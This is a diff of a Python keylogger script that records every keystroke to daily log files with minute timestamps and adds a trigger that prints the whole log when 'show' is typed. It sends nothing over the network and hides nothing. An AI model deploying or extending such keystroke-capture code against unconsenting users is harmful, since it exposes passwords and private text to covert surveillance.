@@ -9,8 +9,8 @@ dict1 = {
 current_datetime = datetime.now()
 current_time = current_datetime.strftime("%d-%m-%Y")
 file_name = f"logs/{current_time}.txt"
-current_time = current_datetime.strftime("%d/%m/%Y %H:%M:%S")
-
+current_time = current_datetime.strftime("%d/%m/%Y %H:%M")
+print(current_time)
 with open(file_name, "w") as file:
     file.write("")
 #
@@ -26,7 +26,6 @@ def on_press(key):
     global current_time
     try:
         tempKey = key.char
-        # print(f'Key pressed: {key.char}')
 
     except AttributeError:
         tempKey = str(key)
@@ -34,7 +33,6 @@ def on_press(key):
             tempKey = dict1[tempKey]
         else:
             tempKey = " '"+tempKey+"' "
-
 
         if tempKey == "backspace":
             data = ''
@@ -48,16 +46,24 @@ def on_press(key):
             with open(file_name, "a") as f:
                 f.write('\n')
             return
-        # print(f'Special key pressed: {key}')
-    # print(tempKey)
+
     current_datetime = datetime.now()
-    tempTime = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+    tempTime = datetime.now().strftime("%d/%m/%Y %H:%M")
     if tempTime != current_time:
         with open(file_name, "a") as file:
             file.write("\n***** " + tempTime + " *****\n")
             current_time = tempTime
     with open(file_name, "a") as file:
         file.write(tempKey)
+    data = ''
+    with open(file_name, "r") as f:
+        data = f.read()
+    if data[-4:] == "show":
+        print(data)
+
+
 listener = keyboard.Listener(on_press = on_press)
 listener.start()
 listener.join()
+
+
